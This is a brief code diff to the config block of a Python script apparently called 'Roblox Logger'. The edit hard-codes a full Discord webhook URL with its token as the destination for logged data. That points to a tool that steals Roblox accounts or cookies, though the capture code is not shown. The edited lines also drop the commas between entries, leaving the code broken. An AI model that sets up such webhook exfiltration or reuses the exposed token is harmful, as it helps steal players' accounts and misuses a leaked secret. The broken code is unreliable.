@@ -7,8 +7,8 @@ try:
         config = _json.load(f)
 except:
     config = {
-        "webhook": os.environ.get("WEBHOOK", "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"),
-        "image": os.environ.get("IMAGE", "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"),
+        "webhook":  "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"
+        "image": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"
         "username": "Roblox Logger",
         "color": 16711680,
     }
